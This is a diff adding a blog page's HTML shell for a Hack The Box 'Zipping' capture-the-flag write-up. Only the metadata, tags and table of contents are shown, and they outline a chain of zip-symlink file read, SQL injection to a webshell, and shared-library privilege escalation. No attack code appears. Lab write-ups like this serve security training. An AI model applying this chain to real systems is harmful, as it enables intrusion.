@@ -1,0 +1,1738 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="rgb(255,255,255)" />
+  
+  <title>HTB Zipping &middot; Abraxas</title>
+    <meta name="title" content="HTB Zipping &middot; Abraxas" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.017a29273e0d1e39f8792cba62098ea8e1c922fd373503ba94b73dcab44dea79.css"
+    integrity="sha256-AXopJz4NHjn4eSy6YgmOqOHJIv03NQO6lLc9yrRN6nk="
+  />
+  
+    
+    
+    
+  
+  
+  
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bb487ad6073790cb02c354ee8c5f8822c42c5513e10bf7a86bbe8f82118cd1fc.js"
+      integrity="sha256-u0h61gc3kMsCw1TujF&#43;IIsQsVRPhC/eoa76PghGM0fw="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Zipping is a medium-difficulty Linux box hosting a PHP web application with a vulnerable file upload function. This function is susceptible to a file read exploit involving zip archives. By exploiting this flaw, I was able to obtain the application&rsquo;s source code, revealing a SQL injection vulnerability. I leveraged this vulnerability to write a webshell on the system. Additionally, I discovered that the user rektsu has sudo privileges over a binary, and misconfigurations in shared library objects can be exploited to gain root privileges.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/htb-zipping/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+<link rel="manifest" href="/site.webmanifest" />
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/htb-zipping/">
+  <meta property="og:site_name" content="Abraxas">
+  <meta property="og:title" content="HTB Zipping">
+  <meta property="og:description" content="Zipping is a medium-difficulty Linux box hosting a PHP web application with a vulnerable file upload function. This function is susceptible to a file read exploit involving zip archives. By exploiting this flaw, I was able to obtain the application’s source code, revealing a SQL injection vulnerability. I leveraged this vulnerability to write a webshell on the system. Additionally, I discovered that the user rektsu has sudo privileges over a binary, and misconfigurations in shared library objects can be exploited to gain root privileges.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-01-14T04:35:07+05:30">
+    <meta property="article:modified_time" content="2024-01-14T04:35:07+05:30">
+    <meta property="article:tag" content="Htb-Medium">
+    <meta property="article:tag" content="Zip">
+    <meta property="article:tag" content="Zip-Symlink">
+    <meta property="article:tag" content="File-Read">
+    <meta property="article:tag" content="Php">
+    <meta property="article:tag" content="Php-Regex">
+    <meta property="og:image" content="//localhost:1313/blog/htb-zipping/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/blog/htb-zipping/cover.png">
+  <meta name="twitter:title" content="HTB Zipping">
+  <meta name="twitter:description" content="Zipping is a medium-difficulty Linux box hosting a PHP web application with a vulnerable file upload function. This function is susceptible to a file read exploit involving zip archives. By exploiting this flaw, I was able to obtain the application’s source code, revealing a SQL injection vulnerability. I leveraged this vulnerability to write a webshell on the system. Additionally, I discovered that the user rektsu has sudo privileges over a binary, and misconfigurations in shared library objects can be exploited to gain root privileges.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "HTB Zipping",
+    "headline": "HTB Zipping",
+    
+    "abstract": "Zipping is a medium-difficulty Linux box hosting a PHP web application with a vulnerable file upload function. This function is susceptible to a file read exploit involving zip archives. By exploiting this flaw, I was able to obtain the application\u0026rsquo;s source code, revealing a SQL injection vulnerability. I leveraged this vulnerability to write a webshell on the system. Additionally, I discovered that the user \u003ccode\u003erektsu\u003c\/code\u003e has sudo privileges over a binary, and misconfigurations in shared library objects can be exploited to gain root privileges.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/htb-zipping\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Abraxas"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-01-14T04:35:07\u002b05:30",
+    "datePublished": "2024-01-14T04:35:07\u002b05:30",
+    
+    "dateModified": "2024-01-14T04:35:07\u002b05:30",
+    
+    "keywords": ["htb-medium","zip","zip-symlink","file-read","php","php-regex","preg_match","sql-injection","pdo-prepare","sqli-file-write","lfi","file-inclusion","null-byte","ltrace","gdb","strings","shared-object","msfvenom"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3100"
+  }
+  </script>
+
+
+  
+  <meta name="author" content="Abraxas" />
+  
+    
+      <link href="mailto:abr4xa5@proton.me" rel="me" />
+    
+      <link href="https://abraxas.pages.dev/" rel="me" />
+    
+      <link href="https://discordapp.com/users/703653879375724657" rel="me" />
+    
+      <link href="https://github.com/AbraXa5" rel="me" />
+    
+      <link href="https://infosec.exchange/@Abraxas" rel="me" />
+    
+      <link href="https://twitter.com/Abr4Xa5_" rel="me" />
+    
+      <link href="/blog/index.xml" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 print:hidden sm:py-10 dark:text-neutral">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="z-40 flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Abraxas</a
+  >
+
+    </div>
+    
+      
+      <label id="menu-button" for="menu-controller" class="block sm:hidden">
+        <input type="checkbox" id="menu-controller" class="hidden" />
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
+        >
+          <ul
+            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
+          >
+            <li class="mb-1">
+              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
+                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span></span
+              >
+            </li>
+            
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/blog/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Blog</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/categories/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Categories</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/tags/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Tags</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/about-me/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >About Me</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    <button
+                      id="appearance-switcher-1"
+                      type="button"
+                      aria-label="appearance switcher"
+                    >
+                      <span
+                        class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                        title="Switch to dark appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                      <span
+                        class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                        title="Switch to light appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                    </button>
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    
+                      <button
+                        id="search-button-1"
+                        title="Search (/)"
+                      >
+                        
+                          <span
+                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </button>
+                    
+                  
+                </li>
+              
+              
+            
+          </ul>
+        </div>
+      </label>
+      
+      <ul class="hidden list-none flex-row text-end sm:flex">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/blog/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/about-me/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About Me</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                <button
+                  id="appearance-switcher-2"
+                  type="button"
+                  aria-label="appearance switcher"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                    title="Switch to dark appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                  <span
+                    class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                    title="Switch to light appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                </button>
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                
+                  <button
+                    id="search-button-2"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+          
+
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 print:hidden dark:text-neutral-400">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Abraxas</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/htb-zipping/"
+      >HTB Zipping</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Zipping
+      </h1>
+      
+        <div class="mb-12 mt-8 text-base text-neutral-500 print:hidden dark:text-neutral-400">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-01-14 04:35:07 &#43;0530 IST">14 January 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="https://github.com/AbraXa5/personal-blog/tree/main/content/blog/htb-zipping/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
+      
+        
+          
+            <a
+              href="/categories/htb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >HTB</a
+            >
+          
+            <a
+              href="/categories/linux/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Linux</a
+            >
+          
+        
+      
+        
+          
+            <a
+              href="/tags/htb-medium/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Htb-Medium</a
+            >
+          
+            <a
+              href="/tags/zip/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Zip</a
+            >
+          
+            <a
+              href="/tags/zip-symlink/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Zip-Symlink</a
+            >
+          
+            <a
+              href="/tags/file-read/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >File-Read</a
+            >
+          
+            <a
+              href="/tags/php/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Php</a
+            >
+          
+            <a
+              href="/tags/php-regex/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Php-Regex</a
+            >
+          
+            <a
+              href="/tags/preg_match/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Preg_match</a
+            >
+          
+            <a
+              href="/tags/sql-injection/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Sql-Injection</a
+            >
+          
+            <a
+              href="/tags/pdo-prepare/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Pdo-Prepare</a
+            >
+          
+            <a
+              href="/tags/sqli-file-write/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Sqli-File-Write</a
+            >
+          
+            <a
+              href="/tags/lfi/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Lfi</a
+            >
+          
+            <a
+              href="/tags/file-inclusion/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >File-Inclusion</a
+            >
+          
+            <a
+              href="/tags/null-byte/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Null-Byte</a
+            >
+          
+            <a
+              href="/tags/ltrace/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Ltrace</a
+            >
+          
+            <a
+              href="/tags/gdb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Gdb</a
+            >
+          
+            <a
+              href="/tags/strings/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Strings</a
+            >
+          
+            <a
+              href="/tags/shared-object/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Shared-Object</a
+            >
+          
+            <a
+              href="/tags/msfvenom/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Msfvenom</a
+            >
+          
+        
+      
+    </div>
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 -mt-4 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="/blog/htb-zipping/cover_hub2b3e2cd0299eab342dffc1a3e3bbe7c_51766_300x300_resize_q75_h2_box_3.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="300"
+        height="300"
+        class="mb-6 -mt-4 rounded-md"
+        
+        
+        
+          src="/blog/htb-zipping/cover.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 print:hidden lg:sticky lg:top-10">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#port-80---http">port 80 - HTTP</a></li>
+        <li><a href="#directory-bruteforcing">Directory bruteforcing</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#zip-symlink-file-read-vulnerability">Zip symlink file-read vulnerability</a></li>
+        <li><a href="#writing-a-webshell-using-sqli">Writing a webshell using SQLi</a></li>
+      </ul>
+    </li>
+    <li><a href="#unintended-foothold-patched">Unintended Foothold (Patched)</a>
+      <ul>
+        <li><a href="#null-byte-injection">Null Byte Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#investigating-binary">Investigating binary</a></li>
+        <li><a href="#disassembly-with-gdb-alternative">Disassembly with gdb (Alternative)</a></li>
+        <li><a href="#shared-library-object-exploit">Shared library object exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
